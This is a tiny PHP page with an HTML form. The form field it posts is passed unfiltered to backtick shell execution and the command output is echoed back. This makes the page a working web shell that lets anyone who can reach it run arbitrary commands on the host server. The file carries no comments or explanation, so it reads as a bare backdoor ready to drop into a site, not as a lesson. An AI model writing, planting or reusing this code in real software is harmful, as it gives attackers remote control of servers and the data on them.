
<?php

$text = $_POST['text'];
$lines = `$text`;
echo "<pre>$lines</pre>";


?>

<form method="post">
<input type="text" name="text" />
<input type="submit" value="Submit" />
</form>

